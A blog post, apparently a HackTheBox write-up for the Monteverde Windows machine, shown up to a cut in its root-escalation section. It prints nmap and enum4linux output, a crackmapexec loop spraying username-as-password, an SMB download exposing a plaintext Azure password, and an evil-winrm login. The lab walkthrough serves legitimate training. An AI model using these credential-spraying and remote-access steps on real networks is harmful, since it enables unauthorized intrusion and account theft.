
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta name="HandheldFriendly" content="True" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta name="robots" content="" />

  <link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro:ital,wght@0,400;0,700;1,400&family=Source+Sans+Pro:ital,wght@0,300;0,400;0,700;1,400&display=swap" rel="stylesheet">

    <link rel="stylesheet" type="text/css" href="../../theme/stylesheet/style.min.css">

    <link id="dark-theme-style" rel="stylesheet" type="text/css"
          media="(prefers-color-scheme: dark)"
    href="../../theme/stylesheet/dark-theme.min.css">

    <link id="pygments-dark-theme" rel="stylesheet" type="text/css"
              media="(prefers-color-scheme: dark)"
          href="../../theme/pygments/monokai.min.css">
    <link id="pygments-light-theme" rel="stylesheet" type="text/css"
              media="(prefers-color-scheme: light), (prefers-color-scheme: no-preference)"
          href="../../theme/pygments/sas.min.css">


  <link rel="stylesheet" type="text/css" href="../../theme/font-awesome/css/fontawesome.css">
  <link rel="stylesheet" type="text/css" href="../../theme/font-awesome/css/brands.css">
  <link rel="stylesheet" type="text/css" href="../../theme/font-awesome/css/solid.css">


    <link href="https://maggick.fr/feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="maggick's logs Atom">



  


 

<meta name="author" content="maggick" />
<meta name="description" content="This is a writeup about a retired HacktheBox machine: Monteverde published on January the 11th 2020 by egre55. This box is classified as a medium machine. The user part is quit direct and easy and involve to enumerate a few basic services. The root part was harder for me as it is based on a specific issue with Azure AD and Password Hash Synchronisation." />
<meta name="keywords" content="security, boot2root, HTB, Windows, SMB, Azure, PHS">


  <meta property="og:site_name" content="maggick's logs"/>
  <meta property="og:title" content="HTB: Monteverde"/>
  <meta property="og:description" content="This is a writeup about a retired HacktheBox machine: Monteverde published on January the 11th 2020 by egre55. This box is classified as a medium machine. The user part is quit direct and easy and involve to enumerate a few basic services. The root part was harder for me as it is based on a specific issue with Azure AD and Password Hash Synchronisation."/>
  <meta property="og:locale" content="en_US"/>
  <meta property="og:url" content="../../2020/06/htb-monteverde.html"/>
  <meta property="og:type" content="article"/>
  <meta property="article:published_time" content="2020-06-15 09:00:00+02:00"/>
  <meta property="article:modified_time" content=""/>
  <meta property="article:author" content="../../author/maggick.html">
  <meta property="article:section" content="security"/>
  <meta property="article:tag" content="security"/>
  <meta property="article:tag" content="boot2root"/>
  <meta property="article:tag" content="HTB"/>
  <meta property="article:tag" content="Windows"/>
  <meta property="article:tag" content="SMB"/>
  <meta property="article:tag" content="Azure"/>
  <meta property="article:tag" content="PHS"/>
  <meta property="og:image" content="https://maggick.fr/media/image.png">

  <title>maggick's logs &ndash; HTB: Monteverde</title>

</head>
<body >
  <aside>
    <div>
      <a href="../../">
        <img src="https://maggick.fr/media/image.png" alt="" title="">
      </a>

      <h1>
        <a href="../../"></a>
      </h1>



      <nav>
        <ul class="list">


              <li>
                <a target="_self"
                   href="../../pages/about.html">
                  About
                </a>
              </li>
              <li>
                <a target="_self"
                   href="../../pages/notes.html">
                  Notes
                </a>
              </li>
              <li>
                <a target="_self"
                   href="../../pages/tools.html">
                  Tools
                </a>
              </li>

        </ul>
      </nav>

      <ul class="social">
          <li>
            <a  class="sc-github" href="https://github.com/maggick" target="_blank">
              <i class="fab fa-github"></i>
            </a>
          </li>
          <li>
            <a  class="sc-twitter" href="https://twitter.com/maggick_fr" target="_blank">
              <i class="fab fa-twitter"></i>
            </a>
          </li>
          <li>
            <a  class="sc-stack-overflow" href="http://stackoverflow.com/users/1827067/maggick" target="_blank">
              <i class="fab fa-stack-overflow"></i>
            </a>
          </li>
          <li>
            <a  class="sc-rss" href="https://maggick.fr/feeds/all.atom.xml" target="_blank">
              <i class="fas fa-rss"></i>
            </a>
          </li>
      </ul>
    </div>

  </aside>
  <main>

    <nav>
      <a href="../../">Home</a>

      <a href="/archives.html">Archives</a>
      <a href="/categories.html">Categories</a>
      <a href="/tags.html">Tags</a>

      <a href="https://maggick.fr/feeds/all.atom.xml">Atom</a>

    </nav>

<article class="single">
  <header>
      
    <h1 id="htb-monteverde">HTB: Monteverde</h1>
    <p>
      Posted on 15 Jun 2020 in <a href="../../category/security.html">security</a>

        &#8226; 13 min read
    </p>
  </header>


  <div>
    <p><img class="align-left" src="/media/2020.06/monteverde_card.png" alt="Craft card" width="262"></p>
<p>This is a writeup about a retired HacktheBox machine:
<a href="https://www.hackthebox.com/home/machines/profile/223">Monteverde</a> published on
January the 11th 2020 by
<a href="https://www.hackthebox.com/home/users/profile/1190">egre55</a>.
This box is classified as a medium machine. The user part is quit direct and
easy and involve to enumerate a few basic services.
The root part was harder for me as it is based on a specific issue with Azure AD
and Password Hash Synchronisation.</p>


<h1>User</h1>
<h2>Recon</h2>
<p>We start with an nmap scan. As often with MS Windows Box a lot of ports are
open.</p>
<div class="highlight"><pre><span></span><code># Nmap 7.80 scan initiated Sun Jan 12 08:35:35 2020 as: nmap -p- -sS -oN nmap_all 10.10.10.172
Nmap scan report for 10.10.10.172
Host is up (0.27s latency).
Not shown: 65516 filtered ports
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49667/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
49671/tcp open  unknown
49699/tcp open  unknown
49768/tcp open  unknown

# Nmap done at Sun Jan 12 08:47:28 2020 -- 1 IP address (1 host up) scanned in 712.82 seconds
</code></pre></div>

<p>We run a service scan on the open ports.</p>
<div class="highlight"><pre><span></span><code># Nmap 7.80 scan initiated Sun Jan 12 08:58:05 2020 as: nmap -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49667,49669,49670,49671,49699,49768 -sSV -oN nmap_sv 10.10.10.172
Nmap scan report for 10.10.10.172
Host is up (0.36s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain?
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-01-12 14:07:30Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49670/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
49699/tcp open  msrpc         Microsoft Windows RPC
49768/tcp open  msrpc         Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=1/12%Time=5E1B25FA%P=x86_64-pc-linux-gnu%r(DNSV
SF:ersionBindReqTCP,20,&quot;\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\
SF:x04bind\0\0\x10\0\x03&quot;);
Service Info: Host: MONTEVERDE; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Jan 12 09:00:45 2020 -- 1 IP address (1 host up) scanned in 159.60 seconds
</code></pre></div>

<h2>Enum4linux</h2>
<p>We run <a href="https://github.com/CiscoCXSecurity/enum4linux">enum4linux</a> on the box.
We get a list of the box username:
 * Guest
 * mhope
 * roleary
 * SABatchJobs
 * smorgan
 * svc-ata
 * svc-bexec
 * svc-netapp</p>
<div class="highlight"><pre><span></span><code>perl enum4linux.pl 10.10.10.172
WARNING: polenum.py is not in your path.  Check that package is installed and your PATH is sane.
Starting enum4linux v0.8.9 (https://github.com/CiscoCXSecurity/enum4linux) on Sun Jan 12 09:09:01 2020

==========================
|    Target Information    |
==========================
Target ........... 10.10.10.172
RID Range ........ 500-550,1000-1050
Username ......... &#39;&#39;
Password ......... &#39;&#39;
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


====================================================
|    Enumerating Workgroup/Domain on 10.10.10.172    |
====================================================
[E] Can&#39;t find workgroup/domain


============================================
|    Nbtstat Information for 10.10.10.172    |
============================================
Looking up status of 10.10.10.172
No reply from 10.10.10.172

=====================================
|    Session Check on 10.10.10.172    |
=====================================
Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 437.
[+] Server 10.10.10.172 allows sessions using username &#39;&#39;, password &#39;&#39;
Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 451.
[+] Got domain/workgroup name:

===========================================
|    Getting domain SID for 10.10.10.172    |
===========================================
Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 359.
Domain Name: MEGABANK
Domain Sid: S-1-5-21-391775091-850290835-3566037492
[+] Host is part of a domain (not a workgroup)

======================================
|    OS information on 10.10.10.172    |
======================================
Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 458.
Use of uninitialized value $os_info in concatenation (.) or string at enum4linux.pl line 464.
[+] Got OS info for 10.10.10.172 from smbclient:
Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 467.
[+] Got OS info for 10.10.10.172 from srvinfo:
Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED

=============================
|    Users on 10.10.10.172    |
=============================
Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 866.
index: 0xfb6 RID: 0x450 acb: 0x00000210 Account: AAD_987d7f2f57d2   Name: AAD_987d7f2f57d2  Desc: Service account for the Synchronization Service with installation identifier 05c97990-7587-4a3d-b312-309adfc172d9 running on computer MONTEVERDE.
index: 0xfd0 RID: 0xa35 acb: 0x00000210 Account: dgalanos   Name: Dimitris Galanos  Desc: (null)
index: 0xedb RID: 0x1f5 acb: 0x00000215 Account: Guest  Name: (null)    Desc: Built-in account for guest access to the computer/domain
index: 0xfc3 RID: 0x641 acb: 0x00000210 Account: mhope  Name: Mike Hope Desc: (null)
index: 0xfd1 RID: 0xa36 acb: 0x00000210 Account: roleary    Name: Ray O&#39;Leary   Desc: (null)
index: 0xfc5 RID: 0xa2a acb: 0x00000210 Account: SABatchJobs    Name: SABatchJobs   Desc: (null)
index: 0xfd2 RID: 0xa37 acb: 0x00000210 Account: smorgan    Name: Sally Morgan  Desc: (null)
index: 0xfc6 RID: 0xa2b acb: 0x00000210 Account: svc-ata    Name: svc-ata   Desc: (null)
index: 0xfc7 RID: 0xa2c acb: 0x00000210 Account: svc-bexec  Name: svc-bexec Desc: (null)
index: 0xfc8 RID: 0xa2d acb: 0x00000210 Account: svc-netapp Name: svc-netapp    Desc: (null)

Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 883.
user:[Guest] rid:[0x1f5]
user:[AAD_987d7f2f57d2] rid:[0x450]
user:[mhope] rid:[0x641]
user:[SABatchJobs] rid:[0xa2a]
user:[svc-ata] rid:[0xa2b]
user:[svc-bexec] rid:[0xa2c]
user:[svc-netapp] rid:[0xa2d]
user:[dgalanos] rid:[0xa35]
user:[roleary] rid:[0xa36]
user:[smorgan] rid:[0xa37]

=========================================
|    Share Enumeration on 10.10.10.172    |
=========================================
Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 640.

  Sharename       Type      Comment
  ---------       ----      -------
SMB1 disabled -- no workgroup available

[+] Attempting to map shares on 10.10.10.172

====================================================
|    Password Policy Information for 10.10.10.172    |
====================================================
[E] Dependent program &quot;polenum.py&quot; not present.  Skipping this check.  Download polenum from https://labs.portcullis.co.uk/tools/polenum/


==============================
|    Groups on 10.10.10.172    |
==============================
Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 542.

[+] Getting builtin groups:
group:[Pre-Windows 2000 Compatible Access] rid:[0x22a]
group:[Incoming Forest Trust Builders] rid:[0x22d]
group:[Windows Authorization Access Group] rid:[0x230]
group:[Terminal Server License Servers] rid:[0x231]
group:[Users] rid:[0x221]
group:[Guests] rid:[0x222]
group:[Remote Desktop Users] rid:[0x22b]
group:[Network Configuration Operators] rid:[0x22c]
group:[Performance Monitor Users] rid:[0x22e]
group:[Performance Log Users] rid:[0x22f]
group:[Distributed COM Users] rid:[0x232]
group:[IIS_IUSRS] rid:[0x238]
group:[Cryptographic Operators] rid:[0x239]
group:[Event Log Readers] rid:[0x23d]
group:[Certificate Service DCOM Access] rid:[0x23e]
group:[RDS Remote Access Servers] rid:[0x23f]
group:[RDS Endpoint Servers] rid:[0x240]
group:[RDS Management Servers] rid:[0x241]
group:[Hyper-V Administrators] rid:[0x242]
group:[Access Control Assistance Operators] rid:[0x243]
group:[Remote Management Users] rid:[0x244]
group:[Storage Replica Administrators] rid:[0x246]

[+] Getting builtin group memberships:
Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.
Group &#39;IIS_IUSRS&#39; (RID: 568) has member: Couldn&#39;t lookup SIDs
Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.
Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.
Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.
Group &#39;Windows Authorization Access Group&#39; (RID: 560) has member: Couldn&#39;t lookup SIDs
Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.
Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.
Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.
Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.
Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.
Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.
Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.
Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.
Group &#39;Pre-Windows 2000 Compatible Access&#39; (RID: 554) has member: Couldn&#39;t lookup SIDs
Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.
Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.
Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.
Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.
Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.
Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.
Group &#39;Guests&#39; (RID: 546) has member: Couldn&#39;t lookup SIDs
Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.
Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.
Group &#39;Remote Management Users&#39; (RID: 580) has member: Couldn&#39;t lookup SIDs
Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.
Group &#39;Users&#39; (RID: 545) has member: Couldn&#39;t lookup SIDs
Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.
Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 542.

[+] Getting local groups:
group:[Cert Publishers] rid:[0x205]
group:[RAS and IAS Servers] rid:[0x229]
group:[Allowed RODC Password Replication Group] rid:[0x23b]
group:[Denied RODC Password Replication Group] rid:[0x23c]
group:[DnsAdmins] rid:[0x44d]
group:[SQLServer2005SQLBrowserUser$MONTEVERDE] rid:[0x44f]
group:[ADSyncAdmins] rid:[0x451]
group:[ADSyncOperators] rid:[0x452]
group:[ADSyncBrowse] rid:[0x453]
group:[ADSyncPasswordSet] rid:[0x454]

[+] Getting local group memberships:
Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.
Group &#39;ADSyncAdmins&#39; (RID: 1105) has member: Couldn&#39;t lookup SIDs
Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.
Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.
Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.
Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.
Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.
Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.
Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.
Group &#39;Denied RODC Password Replication Group&#39; (RID: 572) has member: Couldn&#39;t lookup SIDs
Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.
Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.
Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 593.

[+] Getting domain groups:
group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Group Policy Creator Owners] rid:[0x208]
group:[Cloneable Domain Controllers] rid:[0x20a]
group:[Protected Users] rid:[0x20d]
group:[DnsUpdateProxy] rid:[0x44e]
group:[Azure Admins] rid:[0xa29]
group:[File Server Admins] rid:[0xa2e]
group:[Call Recording Admins] rid:[0xa2f]
group:[Reception] rid:[0xa30]
group:[Operations] rid:[0xa31]
group:[Trading] rid:[0xa32]
group:[HelpDesk] rid:[0xa33]
group:[Developers] rid:[0xa34]

[+] Getting domain group memberships:
Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 614.
Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 614.
Group &#39;Domain Users&#39; (RID: 513) has member: MEGABANK\Administrator
Group &#39;Domain Users&#39; (RID: 513) has member: MEGABANK\krbtgt
Group &#39;Domain Users&#39; (RID: 513) has member: MEGABANK\AAD_987d7f2f57d2
Group &#39;Domain Users&#39; (RID: 513) has member: MEGABANK\mhope
Group &#39;Domain Users&#39; (RID: 513) has member: MEGABANK\SABatchJobs
Group &#39;Domain Users&#39; (RID: 513) has member: MEGABANK\svc-ata
Group &#39;Domain Users&#39; (RID: 513) has member: MEGABANK\svc-bexec
Group &#39;Domain Users&#39; (RID: 513) has member: MEGABANK\svc-netapp
Group &#39;Domain Users&#39; (RID: 513) has member: MEGABANK\dgalanos
Group &#39;Domain Users&#39; (RID: 513) has member: MEGABANK\roleary
Group &#39;Domain Users&#39; (RID: 513) has member: MEGABANK\smorgan
Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 614.
Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 614.
Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 614.
Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 614.
Group &#39;Operations&#39; (RID: 2609) has member: MEGABANK\smorgan
Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 614.
Group &#39;Trading&#39; (RID: 2610) has member: MEGABANK\dgalanos
Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 614.
Group &#39;Domain Guests&#39; (RID: 514) has member: MEGABANK\Guest
Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 614.
Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 614.
Group &#39;Group Policy Creator Owners&#39; (RID: 520) has member: MEGABANK\Administrator
Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 614.
Group &#39;Azure Admins&#39; (RID: 2601) has member: MEGABANK\Administrator
Group &#39;Azure Admins&#39; (RID: 2601) has member: MEGABANK\AAD_987d7f2f57d2
Group &#39;Azure Admins&#39; (RID: 2601) has member: MEGABANK\mhope
Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 614.
Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 614.
Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 614.
Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 614.
Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 614.
Group &#39;HelpDesk&#39; (RID: 2611) has member: MEGABANK\roleary

=======================================================================
|    Users on 10.10.10.172 via RID cycling (RIDS: 500-550,1000-1050)    |
=======================================================================
Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 710.
[E] Couldn&#39;t get SID: NT_STATUS_ACCESS_DENIED.  RID cycling not possible.
Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 742.

=============================================
|    Getting printer info for 10.10.10.172    |
=============================================
Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 995.
Could not initialise spoolss. Error was NT_STATUS_ACCESS_DENIED


enum4linux complete on Sun Jan 12 09:15:49 2020
</code></pre></div>

<h2>Testing creds</h2>
<p>We put the usernames in a file <code>users</code> and we test every account for password
equal username on the SMB service.</p>
<p>The account <code>SABatchJobs:SABatchJobs</code> seems to be a valide account.</p>
<div class="highlight"><pre><span></span><code># while read l; do crackmapexec smb 10.10.10.172 -u $l -p $l --shares; done &lt; users
CME          10.10.10.172:445 MONTEVERDE      [*] Windows 10.0 Build 17763 (name:MONTEVERDE) (domain:MEGABANK)
CME          10.10.10.172:445 MONTEVERDE      [-] MEGABANK\Guest:Guest STATUS_LOGON_FAILURE
[*] KTHXBYE!
CME          10.10.10.172:445 MONTEVERDE      [*] Windows 10.0 Build 17763 (name:MONTEVERDE) (domain:MEGABANK)
CME          10.10.10.172:445 MONTEVERDE      [-] MEGABANK\AAD_987d7f2f57d2:AAD_987d7f2f57d2 STATUS_LOGON_FAILURE
[*] KTHXBYE!
CME          10.10.10.172:445 MONTEVERDE      [*] Windows 10.0 Build 17763 (name:MONTEVERDE) (domain:MEGABANK)
CME          10.10.10.172:445 MONTEVERDE      [-] MEGABANK\mhope:mhope STATUS_LOGON_FAILURE
[*] KTHXBYE!
CME          10.10.10.172:445 MONTEVERDE      [*] Windows 10.0 Build 17763 (name:MONTEVERDE) (domain:MEGABANK)
CME          10.10.10.172:445 MONTEVERDE      [+] MEGABANK\SABatchJobs:SABatchJobs
[*] KTHXBYE!
CME          10.10.10.172:445 MONTEVERDE      [*] Windows 10.0 Build 17763 (name:MONTEVERDE) (domain:MEGABANK)
CME          10.10.10.172:445 MONTEVERDE      [-] MEGABANK\svc-ata:svc-ata STATUS_LOGON_FAILURE
[*] KTHXBYE!
CME          10.10.10.172:445 MONTEVERDE      [*] Windows 10.0 Build 17763 (name:MONTEVERDE) (domain:MEGABANK)
CME          10.10.10.172:445 MONTEVERDE      [-] MEGABANK\svc-bexec:svc-bexec STATUS_LOGON_FAILURE
[*] KTHXBYE!
CME          10.10.10.172:445 MONTEVERDE      [*] Windows 10.0 Build 17763 (name:MONTEVERDE) (domain:MEGABANK)
CME          10.10.10.172:445 MONTEVERDE      [-] MEGABANK\svc-netapp:svc-netapp STATUS_LOGON_FAILURE
[*] KTHXBYE!
CME          10.10.10.172:445 MONTEVERDE      [*] Windows 10.0 Build 17763 (name:MONTEVERDE) (domain:MEGABANK)
CME          10.10.10.172:445 MONTEVERDE      [-] MEGABANK\dgalanos:dgalanos STATUS_LOGON_FAILURE
[*] KTHXBYE!
CME          10.10.10.172:445 MONTEVERDE      [*] Windows 10.0 Build 17763 (name:MONTEVERDE) (domain:MEGABANK)
CME          10.10.10.172:445 MONTEVERDE      [-] MEGABANK\roleary:roleary STATUS_LOGON_FAILURE
[*] KTHXBYE!
CME          10.10.10.172:445 MONTEVERDE      [*] Windows 10.0 Build 17763 (name:MONTEVERDE) (domain:MEGABANK)
CME          10.10.10.172:445 MONTEVERDE      [-] MEGABANK\smorgan:smorgan STATUS_LOGON_FAILURE
[*] KTHXBYE!
</code></pre></div>

<h2>SMB as SABatchJobs</h2>
<p>We connect to the <code>Users$</code> share with our SABatchJobs account. The first user
folder is empty and the second one give us an other account: mhope.</p>
<div class="highlight"><pre><span></span><code># smbclient //10.10.10.172/Users$ -U &quot;SABatchJobs&quot;%&quot;SABatchJobs&quot;
Try &quot;help&quot; to get a list of possible commands.
smb: \&gt; dir
  .                                   D        0  Fri Jan  3 08:12:48 2020
  ..                                  D        0  Fri Jan  3 08:12:48 2020
  dgalanos                            D        0  Fri Jan  3 08:12:30 2020
  mhope                               D        0  Fri Jan  3 08:41:18 2020
  roleary                             D        0  Fri Jan  3 08:10:30 2020
  smorgan                             D        0  Fri Jan  3 08:10:24 2020

    524031 blocks of size 4096. 518419 blocks available
smb: \&gt; cd mhope\
smb: \mhope\&gt; ls
  .                                   D        0  Fri Jan  3 08:41:18 2020
  ..                                  D        0  Fri Jan  3 08:41:18 2020
  azure.xml                          AR     1212  Fri Jan  3 08:40:23 2020

    524031 blocks of size 4096. 518419 blocks available
smb: \mhope\&gt; mget azure.xml
Get file azure.xml? y
getting file \mhope\azure.xml of size 1212 as azure.xml (0.9 KiloBytes/sec) (average 0.9 KiloBytes/sec)

��&lt;Objs Version=&quot;1.1.0.1&quot; xmlns=&quot;http://schemas.microsoft.com/powershell/2004/04&quot;&gt;
  &lt;Obj RefId=&quot;0&quot;&gt;
    &lt;TN RefId=&quot;0&quot;&gt;
      &lt;T&gt;Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential&lt;/T&gt;
      &lt;T&gt;System.Object&lt;/T&gt;
    &lt;/TN&gt;
    &lt;ToString&gt;Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential&lt;/ToString&gt;
    &lt;Props&gt;
      &lt;DT N=&quot;StartDate&quot;&gt;2020-01-03T05:35:00.7562298-08:00&lt;/DT&gt;
      &lt;DT N=&quot;EndDate&quot;&gt;2054-01-03T05:35:00.7562298-08:00&lt;/DT&gt;
      &lt;G N=&quot;KeyId&quot;&gt;00000000-0000-0000-0000-000000000000&lt;/G&gt;
      &lt;S N=&quot;Password&quot;&gt;4n0therD4y@n0th3r$&lt;/S&gt;
    &lt;/Props&gt;
  &lt;/Obj&gt;
&lt;/Objs&gt;
</code></pre></div>

<h2>evil-winrm</h2>
<p>We use <a href="https://github.com/Hackplayers/evil-winrm">evil-winrm</a> to connect to the
box with our new account. We quickly find the user's flag on the Desktop.</p>
<div class="highlight"><pre><span></span><code># ruby evil-winrm.rb -u mhope -i 10.10.10.172 -p &#39;4n0therD4y@n0th3r$&#39;

Evil-WinRM shell v1.8

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\mhope\Documents&gt; cat ../Desktop/user.txt
4961976bd7d8f4eeb2ce3705e2f212f2
</code></pre></div>

<h1>Getting root</h1>
<h2>Azure</h2>
<p>While enumerating more we found some <code>.Azure</code> file containg a few information
about the Azure configuration</p>
<div class="highlight"><pre><span></span><code>*Evil-WinRM* PS C:\Users\mhope\.Azure&gt; ls


    Directory: C:\Users\mhope\.Azure


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         1/3/2020   5:35 AM                ErrorRecords
-a----         1/3/2020   5:31 AM             34 AzurePSDataCollectionProfile.json
-a----         1/3/2020   5:35 AM           2794 AzureRmContext.json
-a----         1/3/2020   5:31 AM            191 AzureRmContextSettings.json
-a----         1/3/2020   5:36 AM           7896 TokenCache.dat

*Evil-WinRM* PS C:\Users\mhope\.Azure&gt; cat AzurePSDataCollectionProfile.json
{&quot;enableAzureDataCollection&quot;:true}
*Evil-WinRM* PS C:\Users\mhope\.Azure&gt; cat AzureRmContext.json
{
  &quot;DefaultContextKey&quot;: &quot;372efea9-7bc4-4b76-8839-984b45edfb98 - john@a67632354763outlook.onmicrosoft.com&quot;,
  &quot;EnvironmentTable&quot;: {},
  &quot;Contexts&quot;: {
    &quot;372efea9-7bc4-4b76-8839-984b45edfb98 - john@a67632354763outlook.onmicrosoft.com&quot;: {
      &quot;Account&quot;: {
        &quot;Id&quot;: &quot;john@a67632354763outlook.onmicrosoft.com&quot;,
        &quot;Credential&quot;: null,
        &quot;Type&quot;: &quot;User&quot;,
        &quot;TenantMap&quot;: {},
        &quot;ExtendedProperties&quot;: {
          &quot;Tenants&quot;: &quot;372efea9-7bc4-4b76-8839-984b45edfb98&quot;
        }
      },
      &quot;Tenant&quot;: {
        &quot;Id&quot;: &quot;372efea9-7bc4-4b76-8839-984b45edfb98&quot;,
        &quot;Directory&quot;: null,
        &quot;ExtendedProperties&quot;: {}
      },
      &quot;Subscription&quot;: null,
      &quot;Environment&quot;: {
        &quot;Name&quot;: &quot;AzureCloud&quot;,
        &quot;OnPremise&quot;: false,
        &quot;ServiceManagementUrl&quot;: &quot;https://management.core.windows.net/&quot;,
        &quot;ResourceManagerUrl&quot;: &quot;https://management.azure.com/&quot;,
        &quot;ManagementPortalUrl&quot;: &quot;https://go.microsoft.com/fwlink/?LinkId=254433&quot;,
        &quot;PublishSettingsFileUrl&quot;: &quot;https://go.microsoft.com/fwlink/?LinkID=301775&quot;,
        &quot;ActiveDirectoryAuthority&quot;: &quot;https://login.microsoftonline.com/&quot;,
